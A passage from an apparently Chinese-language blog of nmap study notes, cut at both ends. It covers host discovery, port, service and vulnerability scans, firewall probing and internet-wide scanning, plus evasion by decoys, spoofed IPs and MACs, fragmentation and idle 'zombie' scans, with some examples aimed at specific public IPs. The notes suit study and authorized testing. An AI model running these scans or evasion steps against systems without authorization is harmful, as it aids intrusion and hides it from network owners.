class="meta prompt_">#</span><span class="language-bash">扫描除文件中IP外的子网主机：</span></span><br><span class="line">nmap 192.168.1.1/24 --excludefile xxx.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">扫描特定主机上的80,21,23端口：</span></span><br><span class="line">nmap –p 80,21,23 192.168.1.1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">nmap默认扫描目标1-10000范围内的端口号。我们则可以通过参数-p来设置我们将要扫描的端口号，端口大小不能超过65535</span></span><br><span class="line">nmap -p1-65535 192.168.1.1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">扫描全端口</span></span><br><span class="line">nmap -p- 192.168.1.1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">nmap路由跟踪</span></span><br><span class="line">nmap --traceroute 8.8.8.8</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="组合用法"><a href="#组合用法" class="headerlink" title="组合用法"></a>组合用法</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#主机发现：</span></span><br><span class="line">nmap -T4 -sn ip</span><br><span class="line"><span class="comment">#端口扫描：</span></span><br><span class="line">nmap -T4 ip</span><br><span class="line"><span class="comment">#服务扫描：</span></span><br><span class="line">nmap -T4 -sV ip</span><br><span class="line"><span class="comment">#操作系统扫描：</span></span><br><span class="line">nmap -T4 -O ip</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#全面扫描：1-1024端口</span></span><br><span class="line">nmap -A -T4 192.168.1.200</span><br><span class="line"><span class="comment">#-A：全面扫描\综合扫描</span></span><br><span class="line"><span class="comment">#-T4：扫描速度，共有6级，T0-T5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#扫描全部端口</span></span><br><span class="line">nmap -sS -v -T4 -Pn -p 0-65535 -oN FullTCP -iL liveHosts.txt</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#以扫描老师为例： </span></span><br><span class="line">nmap -v -Pn -sV -sS -T4 -p 0-65535 -oN FullTCP 47.104.255.11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#-sS：SYN扫描,又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快，效率高（一个完整的tcp连接需要3次握手，而-sS选项不需要3次握手）</span></span><br><span class="line"><span class="comment">#优点：Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机几乎不会把连接记入系统日志。（防止对方判断为扫描攻击），扫描速度快，效率高，在工作中使用频率最高</span></span><br><span class="line"><span class="comment">#缺点：它需要root/administrator权限执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-Pn：即(no ping)扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描</span></span><br><span class="line"><span class="comment">#-iL：导入需要扫描的列表</span></span><br></pre></td></tr></table></figure><h2 id="扫描常用端口及服务信息"><a href="#扫描常用端口及服务信息" class="headerlink" title="扫描常用端口及服务信息"></a>扫描常用端口及服务信息</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">普通的半开扫描</span></span><br><span class="line">nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">系统扫描</span></span><br><span class="line">nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">版本检测</span></span><br><span class="line">nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-oG将扫描结果保存为TXT</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-oN将结果按标准方式保存</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-sS</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-O：扫描操作系统</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-sV：扫描 (版本探测)</span></span><br></pre></td></tr></table></figure><h2 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h2><blockquote><p>适用所有大小网络最好的 nmap 扫描策略</p></blockquote><h3 id="主机发现，生成存活主机列表"><a href="#主机发现，生成存活主机列表" class="headerlink" title="主机发现，生成存活主机列表"></a>主机发现，生成存活主机列表</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24</span><br><span class="line">grep <span class="string">&quot;Status: Up&quot;</span> Discovery.gnmap | <span class="built_in">cut</span> -f 2 -d <span class="string">&#x27; &#x27;</span> &gt; LiveHosts.txt</span><br></pre></td></tr></table></figure><h3 id="端口发现，扫描大部分常用端口"><a href="#端口发现，扫描大部分常用端口" class="headerlink" title="端口发现，扫描大部分常用端口"></a>端口发现，扫描大部分常用端口</h3><blockquote><p><a href="http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf">http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf</a></p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt</span><br><span class="line">nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt</span><br><span class="line"><span class="comment">#扫描开放概率最高的3674个端口</span></span><br><span class="line">nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt</span><br></pre></td></tr></table></figure><h3 id="端口发现，扫描全部端口"><a href="#端口发现，扫描全部端口" class="headerlink" title="端口发现，扫描全部端口"></a>端口发现，扫描全部端口</h3><blockquote><p>但 UDP 端口的扫描会非常慢</p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt</span><br><span class="line">nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt</span><br><span class="line">nmap -p- -T4 -sV 124.223.217.243</span><br></pre></td></tr></table></figure><h3 id="显示-TCP-UDP-端口"><a href="#显示-TCP-UDP-端口" class="headerlink" title="显示 TCP\UDP 端口"></a>显示 TCP\UDP 端口</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;open&quot;</span> FullTCP|<span class="built_in">cut</span> -f 1 -d <span class="string">&#x27; &#x27;</span> | <span class="built_in">sort</span> -nu | <span class="built_in">cut</span> -f 1 -d <span class="string">&#x27;/&#x27;</span> |xargs | sed <span class="string">&#x27;s/ /,/g&#x27;</span>|awk <span class="string">&#x27;&#123;print &quot;T:&quot;$0&#125;&#x27;</span></span><br><span class="line">grep <span class="string">&quot;open&quot;</span> FullUDP|<span class="built_in">cut</span> -f 1 -d <span class="string">&#x27; &#x27;</span> | <span class="built_in">sort</span> -nu | <span class="built_in">cut</span> -f 1 -d <span class="string">&#x27;/&#x27;</span> |xargs | sed <span class="string">&#x27;s/ /,/g&#x27;</span>|awk <span class="string">&#x27;&#123;print &quot;U:&quot;$0&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="侦测服务版本"><a href="#侦测服务版本" class="headerlink" title="侦测服务版本"></a>侦测服务版本</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt</span><br></pre></td></tr></table></figure><h3 id="扫做系统扫描"><a href="#扫做系统扫描" class="headerlink" title="扫做系统扫描"></a>扫做系统扫描</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</span><br></pre></td></tr></table></figure><h3 id="系统和服务检测"><a href="#系统和服务检测" class="headerlink" title="系统和服务检测"></a>系统和服务检测</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt</span><br></pre></td></tr></table></figure><h3 id="nmap躲避防火墙"><a href="#nmap躲避防火墙" class="headerlink" title="nmap躲避防火墙"></a>nmap躲避防火墙</h3><blockquote><p>分段</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -f</span><br></pre></td></tr></table></figure><h3 id="修改默认-MTU-大小，但必须为-8-的倍数-8-16-24-32-等等"><a href="#修改默认-MTU-大小，但必须为-8-的倍数-8-16-24-32-等等" class="headerlink" title="修改默认 MTU 大小，但必须为 8 的倍数(8,16,24,32 等等)"></a>修改默认 MTU 大小，但必须为 8 的倍数(8,16,24,32 等等)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --mtu 24</span><br></pre></td></tr></table></figure><h3 id="生成随机数量的欺骗"><a href="#生成随机数量的欺骗" class="headerlink" title="生成随机数量的欺骗"></a>生成随机数量的欺骗</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -D RND:10 [target]</span><br></pre></td></tr></table></figure><h3 id="手动指定欺骗使用的-IP"><a href="#手动指定欺骗使用的-IP" class="headerlink" title="手动指定欺骗使用的 IP"></a>手动指定欺骗使用的 IP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -D decoy1,decoy2,decoy3 etc.</span><br></pre></td></tr></table></figure><h3 id="僵尸网络扫描-首先需要找到僵尸网络的IP"><a href="#僵尸网络扫描-首先需要找到僵尸网络的IP" class="headerlink" title="僵尸网络扫描, 首先需要找到僵尸网络的IP"></a>僵尸网络扫描, 首先需要找到僵尸网络的IP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sI [Zombie IP] [Target IP]</span><br></pre></td></tr></table></figure><h3 id="指定源端口号"><a href="#指定源端口号" class="headerlink" title="指定源端口号"></a>指定源端口号</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --source-port 80 IP</span><br></pre></td></tr></table></figure><h3 id="在每个扫描数据包后追加随机数量的数据"><a href="#在每个扫描数据包后追加随机数量的数据" class="headerlink" title="在每个扫描数据包后追加随机数量的数据"></a>在每个扫描数据包后追加随机数量的数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --&gt;25 IP</span><br></pre></td></tr></table></figure><h3 id="MAC-地址欺骗，可以生成不同主机的-MAC-地址"><a href="#MAC-地址欺骗，可以生成不同主机的-MAC-地址" class="headerlink" title="MAC 地址欺骗，可以生成不同主机的 MAC 地址"></a>MAC 地址欺骗，可以生成不同主机的 MAC 地址</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --spoof-mac Dell/Apple/3Com IP</span><br></pre></td></tr></table></figure><h3 id="Nmap-进行-Web-漏洞扫描"><a href="#Nmap-进行-Web-漏洞扫描" class="headerlink" title="Nmap 进行 Web 漏洞扫描"></a>Nmap 进行 Web 漏洞扫描</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/nmap/scripts/</span><br><span class="line">wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz</span><br><span class="line">nmap -sS -sV --script=vulscan/vulscan.nse target</span><br><span class="line">nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target</span><br><span class="line">nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target</span><br><span class="line">nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target</span><br><span class="line">nmap -sV --script=vuln target</span><br><span class="line">nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#漏洞扫描</span></span><br><span class="line">nmap --script=vuln 192.168.137.*</span><br><span class="line">nmap.exe -p445 -v --script smb-ghost 192.168.1.0/24</span><br></pre></td></tr></table></figure><h2 id="nmap扫描防火墙"><a href="#nmap扫描防火墙" class="headerlink" title="nmap扫描防火墙"></a>nmap扫描防火墙</h2><p>防火墙在今天网络安全中扮演着重要的角色，如果能对防火墙系统进行详细的探测，那么绕开防火墙或渗透防火墙就更加容易。所以，此处讲解利用Nmap获取防火墙基本信息典型的用法。<br>为了获取防火墙全面的信息，需尽可能多地结合不同扫描方式来探测其状态。在设计命令行参数时，可以综合网络环境来微调时序参数，以便加快扫描速度</p><h3 id="SYN扫描"><a href="#SYN扫描" class="headerlink" title="SYN扫描"></a>SYN扫描</h3><p>首先可以利用基本的SYN扫描方式探测其端口开放状态。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap -sS -T4 www.fujieace.com</span><br><span class="line"><span class="comment">#扫描输出结果为：</span></span><br><span class="line">All 997 ports are filtered PORT STATE SERVICE </span><br><span class="line">80/tcp open http </span><br><span class="line">113/tcp closed auth </span><br><span class="line">507/tcp open crs</span><br></pre></td></tr></table></figure><p>我们可以看到SYN方式探测到3个端口开放，而有997个端口被过滤。Nmap默认扫描只扫描1000个最可能开放的端口，如果想扫描全部的端口，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -T4-p- www.fujieace.com</span><br></pre></td></tr></table></figure><h3 id="FIN扫描"><a href="#FIN扫描" class="headerlink" title="FIN扫描"></a>FIN扫描</h3><p>然后可以利用FIN扫描方式探测防火墙状态。FIN扫描方式用于识别端口是否关闭，收到RST回复说明该端口关闭，否则说明是open或filtered状态。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap -sF -T4 www.fujieace.com</span><br><span class="line"><span class="comment">#扫描输出结果为：</span></span><br><span class="line">PORT STATE SERVICE </span><br><span class="line">7/tcp open|filtered <span class="built_in">echo</span> </span><br><span class="line">9/tcp open|filtered discard </span><br><span class="line">11/tcp open|filtered systat </span><br><span class="line">13/tcp open|filtered daytime </span><br><span class="line">23/tcp open|filtered telnet </span><br><span class="line">25/tcp open|filtered smtp </span><br><span class="line">37/tcp open|filtered time </span><br><span class="line">79/tcp open|filtered finger </span><br><span class="line">80/tcp open|filtered http</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><h3 id="ACK扫描"><a href="#ACK扫描" class="headerlink" title="ACK扫描"></a>ACK扫描</h3><p>然后利用ACK扫描判断端口是否被过滤。针对ACK探测包，未被过滤的端口（无论打开、关闭）会回复RST包。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap -sA -T4 www.fujieace.com</span><br><span class="line"><span class="comment">#扫描输出结果为：</span></span><br><span class="line">Not shown: 997 unfiltered ports PORT STATE SERVICE </span><br><span class="line">135/tcp filtered msrpc </span><br><span class="line">1434/tcp filtered ms-sql-m </span><br><span class="line">32777/tcp filtered sometimes-rpc17</span><br></pre></td></tr></table></figure><p>从结果可以知道997个端口是未被过滤的（unfiltered），而3个（135&#x2F;1434&#x2F;32777）被过滤了。<br>所以，将ACK与FIN扫描 的结果结合分析，我们可以找到很多开放的端口。<br>例如7号端口，FIN中得出的状态是:open或filtered，从ACK中得出的状态是 unfiltered，那么该端口只能是open的。</p><h3 id="Window扫描"><a href="#Window扫描" class="headerlink" title="Window扫描"></a>Window扫描</h3><p>当然也可以利用Window扫描方式，得出一些端口信息，可以与之前扫描分析的结果相互补充。<br>Window扫描方式只对某些TCPIP协议栈才有效。<br>window扫描原理与ACK类似，发送ACK包探测目标端口，对回复的RST包中的Window size进行解析。<br>在某些TCPIP协议栈实现中，关闭的端口在RST中会将Window size设置为0；而开放的端口将Window size设置成非0的值。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap -sW -p- -T4 www.fujieace.com</span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">PORT STATE SERVICE </span><br><span class="line">7/tcp open <span class="built_in">echo</span> </span><br><span class="line">9/tcp open discard </span><br><span class="line">11/tcp open systat </span><br><span class="line">13/tcp open daytime</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>在采用多种方式获取出防火墙状态后，可以进一步进行应用程序与版本侦测及OS侦测。 此处不再赘述</p><h2 id="nmap扫描路由器"><a href="#nmap扫描路由器" class="headerlink" title="nmap扫描路由器"></a>nmap扫描路由器</h2><blockquote><p>nmap内部维护了一份系统与设备的数据库（nmap-os-db），能够识别数千种不同系统与设备。所以，可以用来扫描主流的路由器设备。</p></blockquote><h3 id="扫描思科路由器"><a href="#扫描思科路由器" class="headerlink" title="扫描思科路由器"></a>扫描思科路由器</h3><p>思科路由器会在上述端口中运行了常见的服务。列举出上述端口开放的主机，可以定位到路由器设备可能的IP地址及端口状态。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap -p 1-25,80,512-515,2001,4001,6001,9001 10.20.0.1/16</span><br></pre></td></tr></table></figure><h3 id="扫描路由器TFTP"><a href="#扫描路由器TFTP" class="headerlink" title="扫描路由器TFTP"></a>扫描路由器TFTP</h3><p>大多数的路由器都支持TFTP协议（简单文件传输协议），该协议常用于备份和恢复路由器的配置文件，运行在UDP 69端口上。使用上述命令可以探测出路由器是否开放TFTP。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap –sU –p69 –nvv target</span><br></pre></td></tr></table></figure><h3 id="扫描路由器操作系统"><a href="#扫描路由器操作系统" class="headerlink" title="扫描路由器操作系统"></a>扫描路由器操作系统</h3><p>与通用PC扫描方式类似，使用-O选项扫描路由器的操作系统。-F用于快速扫描最可能开放的100个端口，并根据端口扫描结果进一步做OS的指纹分析</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -O -F -n 192.168.1.1</span><br></pre></td></tr></table></figure><h2 id="nmap扫描互联网"><a href="#nmap扫描互联网" class="headerlink" title="nmap扫描互联网"></a>nmap扫描互联网</h2><blockquote><p>Nmap内部的设计非常强大灵活，既能扫描单个主机、小型的局域网，也可以扫描成千上万台主机从中发掘用户关注的信息。<br>扫描大量主机，需要对扫描时序等参数进行仔细的优化。</p></blockquote><h3 id="发现互联网上web服务器"><a href="#发现互联网上web服务器" class="headerlink" title="发现互联网上web服务器"></a>发现互联网上web服务器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -iR 100000 -sS -PS80 -p 80 -oG nmap.txt </span><br></pre></td></tr></table></figure><p>随机地产生10万个IP地址，对其80端口进行扫描。<br>将扫描结果以greppable（可用grep命令提取）格式输出到nmap.txt文件。可以使用grep命令从输出文件提取关心的细节信息。</p><h3 id="统计互联网主机基本数据"><a href="#统计互联网主机基本数据" class="headerlink" title="统计互联网主机基本数据"></a>统计互联网主机基本数据</h3><p>Nmap的创始人Fyodor在2008年的Black Hat大会发表一篇演讲，讲的是如何使用Nmap来扫描互联网（Nmap: Scanning the Internet）， 资料地址：<a href="http://nmap.org/presentations/BHDC08/">http://nmap.org/presentations/BHDC08/</a><br>Fyodor进行互联网扫描的初衷是统计出网络经验数据并用之优化Nmap的性能。例如，根据统计出每个端口开放的概率，优先扫描常见端口，以节省用户的时间。</p><h4 id="产生随机IP地址"><a href="#产生随机IP地址" class="headerlink" title="产生随机IP地址"></a>产生随机IP地址</h4><p>产生100万个随机的IP地址，并将之保存到文件中，方便后续扫描时作为参数输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -iR 1200000 -sL -n | grep &quot;not scanned&quot; | awk &#x27;&#123;print $2&#125;&#x27; | sort -n | uniq &gt;! tp; head -25000000 tp &gt;! tcp-allports-1M-IPs; rm tp</span><br></pre></td></tr></table></figure><blockquote><p>上述命令含义：随机生成1200000个IP地址（-iR 120000），并进行列表扫描（-sL，列举出IP地址，不进行真正的扫描），不进行dns解析操作（-n），这样将产生Nmap列表扫描的结果。在此结果中搜出未扫描的行（grep “not scanned”），打印出每一行的第二列内容（awk ‘{print $2}’，也就是IP地址），然后对获取到的IP地址进行排序（sort -n），然后剔除重复IP地址，将结果保存到临时文件tp，再取出前1000000个IP地址保存到tcp-allports-1M-IPs文件中，删除临时文件。<br>总之，此处产生了1000000个随机IP地址存放在tcp-allports-1M-IPs文件中。</p></blockquote><h4 id="优化主机发现"><a href="#优化主机发现" class="headerlink" title="优化主机发现"></a>优化主机发现</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP -PE -PP -PS21,22,23,25,80,113,31339-PA80,113,443,10042 –source-port 53 -T4 -iL tcp-allports-1M-IPs</span><br></pre></td></tr></table></figure><blockquote><p>上述命令进行主机发现：使用产生的IP地址（-iL tcp-allports-1M-IPs），指定发送包的源端口为53（–source-port 53，该端口是DNS查询端口，一般的防火墙都允许来自此端口的数据包），时序级别为4（-T4，探测速度比较快），以TCP SYN包方式探测目标机的21,22,23,25,80,113,31339端口，以TCP ACK包方式探测对方80,113,443,10042端口，另外也发送ICMP ECHO&#x2F;ICMP TIMESTAMP包探测对方主机。只要上述的探测包中得到一个回复，就可以证明目标主机在线。</p></blockquote><h4 id="完整的扫描命令"><a href="#完整的扫描命令" class="headerlink" title="完整的扫描命令"></a>完整的扫描命令</h4><p>在准备了必要的IP地址文件，并对主机发现参数优化后，我们就得到最终的扫描命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -S [srcip] -d –max-scan-delay 10 -oAlogs/tcp-allports-%T-%D -iL tcp-allports-1M-IPs –max-retries 1–randomize-hosts -p- -PS21,22,23,25,53,80,443 -T4 –min-hostgroup 256 –min-rate175 –max-rate 300</span><br></pre></td></tr></table></figure><blockquote><p>上述命令用于扫描互联网上100万台主机全部的TCP端口的开放情况。使用包含100万个IP地址的文件（-iL tcp-allports-1M-IPs），源端IP地址设置为srcip(指定一个IP地址，保证该IP地址位于统一局域网中，否则无法收到目标机的回 复包)，主机发现过程使用TCP SYN包探测目标机的21,22,23,25,53,80,443，扫描过程将随机打乱主机顺序（–randomize-hosts，因为文件中的IP 已经排序，这里将之打乱，避免被防火墙检查出），端口扫描过程检查全部的TCP端口（-p-，端口1到65535），使用时序级别为4（-T4，速度比较 快），将结果以XML&#x2F;grepable&#x2F;普通格式输出到文件中（-oA logs&#x2F;tcp-allports-%T-%D，其中%T表示扫描时间，%D表示扫描日期）。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-d表示打印调试出信息。</span><br><span class="line">–max-scan-delay 10表示发包最多延时10秒，防止特殊情景下等待过长的时间。</span><br><span class="line">–max-retries 1，表示端口扫描探测包最多被重传一次，防止Nmap在没有收到回复的情况下多次重传探测包，当然这样也会降低探测的准确性。</span><br><span class="line">–min-host-group 256表示进行端口扫描与版本侦测时，同时进行探测的主机的数量，这里至少256个主机一组来进行扫描，可以加快扫描速度。</span><br><span class="line">–min-rate 175和–max-rate 300，表示发包速率介于175和300之间，保证扫描速度不会太慢，也不会因为速率过高引起目标机的警觉。</span><br></pre></td></tr></table></figure><h4 id="扫描结果"><a href="#扫描结果" class="headerlink" title="扫描结果:"></a>扫描结果:</h4><p>Fyodor组织的此次扫描得出很多重要结论，统计出了互联网最有可能开放的10个TCP端口。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">80 (http)</span><br><span class="line">23 (telnet)</span><br><span class="line">22 (ssh)</span><br><span class="line">443 (https)</span><br><span class="line">3389 (ms-term-serv)</span><br><span class="line">445 (microsoft-ds)</span><br><span class="line">139 (netbios-ssn)</span><br><span class="line">21 (ftp)</span><br><span class="line">135 (msrpc)</span><br><span class="line">25 (smtp)</span><br></pre></td></tr></table></figure><p>最有可能开放的10个UDP端口。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">137 (netbios-ns)</span><br><span class="line">161 (snmp)</span><br><span class="line">1434 (ms-sql-m)</span><br><span class="line">123 (ntp)</span><br><span class="line">138 (netbios-dgm)</span><br><span class="line">445 (microsoft-ds)</span><br><span class="line">135 (msrpc)</span><br><span class="line">67 (dhcps)</span><br><span class="line">139 (netbios-ssn)</span><br><span class="line">53 (domain)</span><br></pre></td></tr></table></figure><h2 id="nmap扫描Web站点"><a href="#nmap扫描Web站点" class="headerlink" title="nmap扫描Web站点"></a>nmap扫描Web站点</h2><p>Web是互联网上最广泛的应用，而且越来越多的服务倾向于以Web形式提供出来，所以对Web安全监管也越来越重要。<br>目前安全领域有很多专门的 Web扫描软件（如AppScan、WebInspect、W3AF），能够提供端口扫描、漏洞扫描、漏洞利用、分析报表等诸多功能。<br>而Nmap作为一款 开源的端口扫描器，对Web扫描方面支持也越来越强大，可以完成Web基本的信息探测：<strong>服务器版本、支持的Method、是否包含典型漏洞</strong>。<br>功能已经远远 超过同领域的其他开源软件，如HTTPrint、Httsquash。<br>目前Nmap中对Web的支持主要通过Lua脚本来实现，NSE脚本库中共有50多个HTTP相关的脚本。<br>扫描实例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -p 80 -T4 --script http*,default scanme.nmap.org</span><br></pre></td></tr></table></figure><blockquote><p>上面以扫描scanme.nmap.org的Web应用展示Nmap提供Web扫描能力，从图中可以看到扫描结果中提供了比较丰富的信息。 首先是应用程序及版本：Apachehttpd 2.2.14 (Ubuntu)，然后搜出了该站点的affiliate-id:该ID可用于识别同一拥有者的不同页面。然后输出HTTP-headers信息，从中查看到基本配置信息。，从http-title中，可以看到网页标题。某些网页标题可能会泄漏重要信息，所以这里也应对其检查。</p></blockquote><h2 id="高级参数"><a href="#高级参数" class="headerlink" title="高级参数"></a>高级参数</h2><h3 id="查看本地路由与接口"><a href="#查看本地路由与接口" class="headerlink" title="查看本地路由与接口"></a>查看本地路由与接口</h3><p>Nmap中提供了<code>–iflist</code>选项来查看本地主机的接口信息与路由信息。<br>当遇到无法达到目标主机或想选择从多块网卡中某一特定网卡访问目标主机时，可以查看<code>nmap –iflist</code>中提供的网络接口信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap –iflist </span><br></pre></td></tr></table></figure><h3 id="指定网口与IP地址"><a href="#指定网口与IP地址" class="headerlink" title="指定网口与IP地址"></a>指定网口与IP地址</h3><p>在Nmap可指定用哪个网口发送数据， -e <interface> 选项。接口的详细信息可以参考–iflist选项输出结果。<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -e eth0 targetip</span><br></pre></td></tr></table></figure><p>Nmap也可以<strong>显式地指定发送的源端IP地址</strong>。使用 -S <spoofip> 选项，nmap将用指定的spoofip作为源端IP来发送探测包。<br>另外可以<strong>使用Decoy（诱骗）方式来掩盖真实的扫描地址</strong>，例如<code>-D ip1,ip2,ip3,ip4,ME</code>，这样就会产生多个虚假的ip同时对目标机进行探测，其中ME代表本机的真实地址，这样对方的防火墙不容易识别出是扫描者的身份。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap -T4 -F -n -Pn -D 192.168.1.100,192.168.1.101,192.168.1.102,ME 192.168.1.1</span><br></pre></td></tr></table></figure><h3 id="定制探测包"><a href="#定制探测包" class="headerlink" title="定制探测包"></a>定制探测包</h3><p>Nmap提供<code>–scanflags</code>选项，用户可以对需要发送的TCP探测包的标志位进行完全的控制。<br>可以使用数字或符号指定TCP标志位：<code>URG, ACK, PSH,RST, SYN,and FIN</code>。<br>例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sX -T4 –scanflags URGACKPSHRSTSYNFINtargetip</span><br></pre></td></tr></table></figure><blockquote><p>此命令设置全部的TCP标志位为1，可以用于某些特殊场景的探测。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">–ip-options可以定制IP包的options字段。</span><br><span class="line">-S指定虚假的IP地址</span><br><span class="line">-D指定一组诱骗IP地址（ME代表真实地址）</span><br><span class="line">-e指定发送探测包的网络接口</span><br><span class="line">-g（–source- port）指定源端口</span><br><span class="line">-f指定使用IP分片方式发送探测包</span><br><span class="line">–spoof-mac指定使用欺骗的MAC地址</span><br><span class="line">-ttl指定生存时间</span><br></pre></td></tr></table></figure><h1 id="nmap扫描技术"><a href="#nmap扫描技术" class="headerlink" title="nmap扫描技术"></a>nmap扫描技术</h1><h3 id="Tcp-SYN-Scan-sS-："><a href="#Tcp-SYN-Scan-sS-：" class="headerlink" title="Tcp SYN Scan (sS)："></a>Tcp SYN Scan (sS)：</h3><blockquote><p><strong>半开放扫描</strong>，这种技术使得Nmap不需要通过完整的握手，就能获得远程主机的信息。 nmap发送SYN包到远程主机，但是它不会产生任何会话.因此<strong>不会在目标主机上产生任何日志记录,因为没有形成会话</strong>。这个就是SYN扫描的优势。<br>如果nmap命令中没有指出扫描类型,默认的就是tcp SYN。但是它需要root&#x2F;administrator权限.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS IP</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong>有一个疑问：到底查看什么日志可以看到自己被扫了呢？？</strong></li></ul><p>在Ubuntu上，查看到此日志， auth.log记录了所有和用户认证相关的日志。无论是我们通过 ssh 登录，还是通过 sudo 执行命令都会在 auth.log 中产生记录。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -f -n 50 auth.log</span><br></pre></td></tr></table></figure><p>但是呢？我在扫描的时候，所看到的痕迹很少，而且显示的内容是一个不开放的端口？为什么？</p><p>Ubuntu上面在哪看？？？？其他在var&#x2F;log目录下的日志也看过，没有痕迹</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209251450536.png" alt="image-20220925145049127" style="zoom:50%;" /></blockquote><h3 id="Tcp-connect-scan-sT-："><a href="#Tcp-connect-scan-sT-：" class="headerlink" title="Tcp connect() scan(sT)："></a>Tcp connect() 